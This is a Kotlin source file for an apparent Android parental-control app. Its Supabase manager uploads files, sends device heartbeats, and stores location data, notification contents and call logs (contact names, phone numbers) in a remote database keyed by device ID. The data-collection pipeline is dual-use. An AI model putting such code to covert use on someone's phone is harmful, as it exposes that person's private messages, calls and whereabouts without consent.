package com.example.parentalcontrol

import android.content.Context
import android.util.Log
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.postgrest
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.storage.Storage
import io.github.jan.supabase.storage.storage
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.realtime.realtime
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.serialization.kotlinx.json.*
import io.ktor.client.engine.android.Android
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.datetime.Clock
import kotlinx.serialization.Serializable
import java.io.File
import java.util.UUID

/**
 * مدير Supabase للتعامل مع رفع الملفات والبيانات
 */
class SupabaseManager private constructor() {

    companion object {
        private const val TAG = "SupabaseManager"

        @Volatile
        private var instance: SupabaseManager? = null

        fun getInstance(): SupabaseManager {
            return instance ?: synchronized(this) {
                instance ?: SupabaseManager().also { instance = it }
            }
        }
    }

    var supabaseClient: SupabaseClient? = null
    fun getClient(): SupabaseClient? = supabaseClient
    private var isInitialized = false

    fun initialize(supabaseUrl: String, supabaseAnonKey: String): Boolean {
        return try {
            if (isInitialized) return true

            supabaseClient = createSupabaseClient(
                supabaseUrl = supabaseUrl,
                supabaseKey = supabaseAnonKey
            ) {
                httpEngine = Android.create()
                install(Storage)
                install(Postgrest)
                install(Realtime)
            }

            isInitialized = true
            Log.i(TAG, "Supabase initialized successfully")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize Supabase: ${e.message}", e)
            false
        }
    }

    fun ensureInitialized() {
        if (!isInitialized || supabaseClient == null) {
            throw IllegalStateException("SupabaseManager is not initialized.")
        }
    }

    suspend fun uploadFile(
        file: File,
        bucket: String,
        folder: String? = null,
        customFileName: String? = null
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            val fileBytes = file.readBytes()
            val extension = file.extension
            val fileName = customFileName ?: "${UUID.randomUUID()}.$extension"
            val filePath = if (folder != null) "$folder/$fileName" else fileName

            val storage = supabaseClient!!.storage
            storage.from(bucket).upload(
                path = filePath,
                data = fileBytes,
                upsert = false
            )

            val publicUrl = storage.from(bucket).publicUrl(filePath)
            UploadResult.Success(fileName, filePath, publicUrl, fileBytes.size.toLong(), bucket)
        } catch (e: Exception) {
            Log.e(TAG, "Upload failed: ${e.message}", e)
            UploadResult.Error("Upload failed: ${e.message}")
        }
    }

    suspend fun uploadMultipleFiles(
        files: List<File>,
        bucket: String,
        folder: String? = null
    ): List<UploadResult> = withContext(Dispatchers.IO) {
        files.map { uploadFile(it, bucket, folder) }
    }

    suspend fun downloadFile(bucket: String, filePath: String): DownloadResult = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            val storage = supabaseClient!!.storage
            val fileBytes = storage.from(bucket).downloadAuthenticated(filePath)
            DownloadResult.Success(fileBytes, filePath.substringAfterLast('/'), fileBytes.size.toLong())
        } catch (e: Exception) {
            DownloadResult.Error(e.message ?: "Download failed")
        }
    }

    suspend fun listFiles(bucket: String, folder: String? = null): List<FileInfo> = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            val storage = supabaseClient!!.storage
            val items = storage.from(bucket).list(folder ?: "")
            items.map { FileInfo(it.name, it.id ?: "", it.createdAt?.toString() ?: "", it.updatedAt?.toString() ?: "") }
        } catch (e: Exception) {
            emptyList()
        }
    }

    fun getPublicUrl(bucket: String, filePath: String): String? {
        return try {
            ensureInitialized()
            supabaseClient!!.storage.from(bucket).publicUrl(filePath)
        } catch (e: Exception) {
            null
        }
    }

    suspend fun createBucket(bucketName: String, isPublic: Boolean = false): Boolean = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            supabaseClient!!.storage.createBucket(bucketName) {
                public = isPublic
            }
            true
        } catch (e: Exception) {
            false
        }
    }

    suspend fun deleteFile(bucket: String, filePath: String): Boolean = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            supabaseClient!!.storage.from(bucket).delete(filePath)
            true
        } catch (e: Exception) {
            false
        }
    }

    suspend fun downloadFile(bucket: String, remotePath: String, localFile: java.io.File): Boolean = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            // downloadAuthenticated يدعم البuckets الخاصة (private) باستخدام الـ anon key
            val bytes = supabaseClient!!.storage.from(bucket).downloadAuthenticated(remotePath)
            localFile.writeBytes(bytes)
            Log.i(TAG, "Downloaded $remotePath → ${localFile.length()} bytes")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Download failed [$remotePath]: ${e.message}")
            false
        }
    }

    suspend fun updateHeartbeat(context: Context) = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            val deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            
            // نحدث وقت آخر ظهور في جدول الإعدادات مع إرسال معلومات الإصدار والجهاز
            val packageInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            val versionCode = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                packageInfo.longVersionCode.toInt()
            } else {
                @Suppress("DEPRECATION")
                packageInfo.versionCode
            }
            
            val deviceInfo = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL} (Android ${android.os.Build.VERSION.RELEASE})"

            val heartbeat = HeartbeatPayload(
                device_id = deviceId,
                current_version_code = versionCode,
                device_info = deviceInfo,
                updated_at = Clock.System.now().toString()
            )

            supabaseClient!!.postgrest.from("remote_settings").upsert(heartbeat, onConflict = "device_id")

            Log.i(TAG, "Heartbeat successful [$versionCode] for device: $deviceId")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Heartbeat failed for ${context.packageName}: ${e.message}")
            try {
                logRemote(context, TAG, "ERROR", "Heartbeat serialization / query failed: ${e.message}")
            } catch (_: Exception) {}
            false
        }
    }


    suspend fun saveLocation(locationData: LocationData): LocationSaveResult = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            supabaseClient!!.postgrest.from("locations").insert(locationData)
            LocationSaveResult.Success(locationData.deviceId ?: "ok")
        } catch (e: Exception) {
            LocationSaveResult.Error(e.message ?: "Unknown error")
        }
    }

    suspend fun deleteLocationsByDeviceId(deviceId: String): Boolean = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            supabaseClient!!.postgrest.from("locations").delete {
                filter { eq("device_id", deviceId) }
            }
            true
        } catch (e: Exception) {
            false
        }
    }

    suspend fun saveNotification(log: NotificationLog): Boolean = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            supabaseClient!!.postgrest.from("notification_logs").insert(log)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Notification save failed: ${e.message}")
            false
        }
    }

    suspend fun saveCallLog(callLog: CallLogRecord): Boolean = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            supabaseClient!!.postgrest.from("call_logs").upsert(callLog)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Call log upsert failed: ${e.message}")
            false
        }
    }

    suspend fun saveErrorLog(log: ErrorLog): Boolean = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            supabaseClient!!.postgrest.from("error_logs").insert(log)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error log save failed: ${e.message}")
            false
        }
    }

    /**
     * تسجيل رسالة للسحاب للمتابعة عن بعد
     */
    suspend fun logRemote(context: Context, tag: String, level: String, message: String): Boolean = withContext(Dispatchers.IO) {
        try {
            ensureInitialized()
            val deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            
            val log = RemoteLog(deviceId, tag, level, message)
            supabaseClient!!.postgrest.from("remote_logs").insert(log)
            true
        } catch (e: Exception) {
            Log.e("SupabaseManager", "Remote log failed: ${e.message}")
            false
        }
    }
}

@Serializable
data class NotificationLog(
    val device_id: String,
    val package_name: String,
    val app_name: String,
    val title: String,
    val content: String,
    val post_time: String
)

@Serializable
data class CallLogRecord(
    val device_id: String,
    val call_type: String,
    val contact_name: String?,
    val phone_number: String?,
    val duration_seconds: Int,
    val timestamp: String
)

@Serializable
data class ErrorLog(
    val device_id: String,
    val error_message: String,
    val stack_trace: String,
    val app_version: String,
    val timestamp: String
)

@Serializable
data class RemoteLog(
    val device_id: String,
    val tag: String,
    val level: String,
    val message: String,
    val created_at: String = kotlinx.datetime.Clock.System.now().toString()
)

@Serializable
data class HeartbeatPayload(
    val device_id: String,
    val current_version_code: Int,
    val device_info: String,
    val updated_at: String
)


sealed class UploadResult {
    data class Success(val fileName: String, val filePath: String, val publicUrl: String, val fileSize: Long, val bucket: String) : UploadResult()
    data class Error(val message: String) : UploadResult()
}

sealed class DownloadResult {
    data class Success(val data: ByteArray, val fileName: String, val fileSize: Long) : DownloadResult()
    data class Error(val message: String) : DownloadResult()
}

data class FileInfo(val name: String, val id: String, val createdAt: String, val updatedAt: String)
